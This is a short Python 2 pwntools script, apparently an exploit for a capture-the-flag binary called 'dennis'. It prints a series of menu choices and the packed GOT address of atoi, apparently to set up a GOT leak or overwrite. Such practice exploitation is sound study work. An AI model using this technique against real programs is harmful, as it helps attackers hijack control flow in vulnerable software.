#!/usr/bin/env python2

from pwn import *

context.log_level = 'critical'

elf = ELF('./dennis')

print '1'
print '8'
print '4'
print p32(elf.got['atoi'])
print '3'